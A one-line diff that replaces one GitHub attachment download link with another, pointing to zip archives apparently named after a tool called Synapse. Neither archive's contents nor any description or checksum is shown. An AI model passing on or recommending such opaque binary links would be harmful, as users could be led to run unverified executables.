@@ -1,1 +1,1 @@
-https://github.com/user-attachments/files/20850888/SynapseBin.zip
+https://github.com/user-attachments/files/20851227/Synapse.UI.WPF.zip
